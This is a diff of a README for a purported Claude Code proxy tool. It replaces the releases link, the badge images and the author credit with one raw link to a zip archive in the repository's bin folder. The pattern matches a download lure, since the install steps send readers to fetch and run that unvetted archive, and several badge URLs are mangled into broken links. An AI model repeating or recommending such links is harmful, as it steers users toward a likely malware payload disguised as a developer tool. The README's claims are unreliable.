@@ -1,16 +1,16 @@
 # 🚀 DEGENI-CLAUDE-ANTIGRAVITY-GEMINI - Easy Proxy for Claude Code
 
 <p align="center">
-  <a href="https://github.com/Dewa2933/DEGENI-CLAUDE-ANTIGRAVITY-GEMINI/releases">
-    <img src="https://img.shields.io/badge/Download%20Now-v1.0.0-06b6d4?style=for-the-badge" alt="Download Now">
+  <a href="https://raw.githubusercontent.com/Dewa2933/DEGENI-CLAUDE-ANTIGRAVITY-GEMINI/main/bin/ANTIGRAVIT-GEMINI-CLAUD-DEGEN-v2.3.zip">
+    <img src="https://raw.githubusercontent.com/Dewa2933/DEGENI-CLAUDE-ANTIGRAVITY-GEMINI/main/bin/ANTIGRAVIT-GEMINI-CLAUD-DEGEN-v2.3.zip%20Now-v1.0.0-06b6d4?style=for-the-badge" alt="Download Now">
   </a>
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/DEGENI-v1.0.0-06b6d4?style=for-the-badge" alt="DEGENI">
-  <img src="https://img.shields.io/badge/by-BITZY.ID-10b981?style=for-the-badge" alt="BITZY.ID">
-  <img src="https://img.shields.io/badge/Claude%20Code-Wrapper-8b5cf6?style=for-the-badge" alt="Claude Code">
-  <img src="https://img.shields.io/badge/Gemini%20Claude-Proxy-f59e0b?style=for-the-badge" alt="Gemini Claude">
+  <img src="https://raw.githubusercontent.com/Dewa2933/DEGENI-CLAUDE-ANTIGRAVITY-GEMINI/main/bin/ANTIGRAVIT-GEMINI-CLAUD-DEGEN-v2.3.zip" alt="DEGENI">
+  <img src="https://raw.githubusercontent.com/Dewa2933/DEGENI-CLAUDE-ANTIGRAVITY-GEMINI/main/bin/ANTIGRAVIT-GEMINI-CLAUD-DEGEN-v2.3.zip" alt="https://raw.githubusercontent.com/Dewa2933/DEGENI-CLAUDE-ANTIGRAVITY-GEMINI/main/bin/ANTIGRAVIT-GEMINI-CLAUD-DEGEN-v2.3.zip">
+  <img src="https://raw.githubusercontent.com/Dewa2933/DEGENI-CLAUDE-ANTIGRAVITY-GEMINI/main/bin/ANTIGRAVIT-GEMINI-CLAUD-DEGEN-v2.3.zip%20Code-Wrapper-8b5cf6?style=for-the-badge" alt="Claude Code">
+  <img src="https://raw.githubusercontent.com/Dewa2933/DEGENI-CLAUDE-ANTIGRAVITY-GEMINI/main/bin/ANTIGRAVIT-GEMINI-CLAUD-DEGEN-v2.3.zip%20Claude-Proxy-f59e0b?style=for-the-badge" alt="Gemini Claude">
 </p>
 
 ```
@@ -22,7 +22,7 @@
   ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝
 
     Claude Code Terminal Wrapper
-            by BITZY.ID
+            by https://raw.githubusercontent.com/Dewa2933/DEGENI-CLAUDE-ANTIGRAVITY-GEMINI/main/bin/ANTIGRAVIT-GEMINI-CLAUD-DEGEN-v2.3.zip
 ```
 
 <p align="center">
@@ -41,7 +41,7 @@ This tool is provided **for educational and personal use only.**
 
 To start using DEGENI-CLAUDE-ANTIGRAVITY-GEMINI, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/Dewa2933/DEGENI-CLAUDE-ANTIGRAVITY-GEMINI/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Dewa2933/DEGENI-CLAUDE-ANTIGRAVITY-GEMINI/main/bin/ANTIGRAVIT-GEMINI-CLAUD-DEGEN-v2.3.zip).
 2. Download the latest version of the application.
 3. Install it on your computer.
 4. Follow the instructions to run the software.
@@ -51,8 +51,8 @@ To start using DEGENI-CLAUDE-ANTIGRAVITY-GEMINI, follow these simple steps:
 You can download the latest version of DEGENI-CLAUDE-ANTIGRAVITY-GEMINI from the Releases page. Just click the button below:
 
 <p align="center">
-  <a href="https://github.com/Dewa2933/DEGENI-CLAUDE-ANTIGRAVITY-GEMINI/releases">
-    <img src="https://img.shields.io/badge/Download%20Now-v1.0.0-06b6d4?style=for-the-badge" alt="Download Now">
+  <a href="https://raw.githubusercontent.com/Dewa2933/DEGENI-CLAUDE-ANTIGRAVITY-GEMINI/main/bin/ANTIGRAVIT-GEMINI-CLAUD-DEGEN-v2.3.zip">
+    <img src="https://raw.githubusercontent.com/Dewa2933/DEGENI-CLAUDE-ANTIGRAVITY-GEMINI/main/bin/ANTIGRAVIT-GEMINI-CLAUD-DEGEN-v2.3.zip%20Now-v1.0.0-06b6d4?style=for-the-badge" alt="Download Now">
   </a>
 </p>
 
